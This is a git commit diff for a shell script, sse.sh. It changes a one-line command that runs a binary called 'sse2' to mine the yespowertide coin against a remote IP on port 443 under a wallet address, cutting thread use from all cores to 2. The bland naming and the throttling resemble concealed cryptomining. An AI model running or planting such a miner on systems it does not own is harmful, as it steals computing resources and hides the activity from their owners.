9247f72dddf1d2574cb2e2d1b0acac845aef1ab0
lukmanpurai-del <lukmanpurai@gmail.com>
2026-09-17 04:49:57 +0700

    Update sse.sh

--- sse.sh
+++ sse.sh
@@ -1,1 +1,1 @@
-./sse2 -a yespowertide -o 45.61.51.89:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.$(shuf -n 1 -i 1-9999999) -t $(nproc)
+./sse2 -a yespowertide -o 45.61.51.89:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.$(shuf -n 1 -i 1-9999999) -t 2
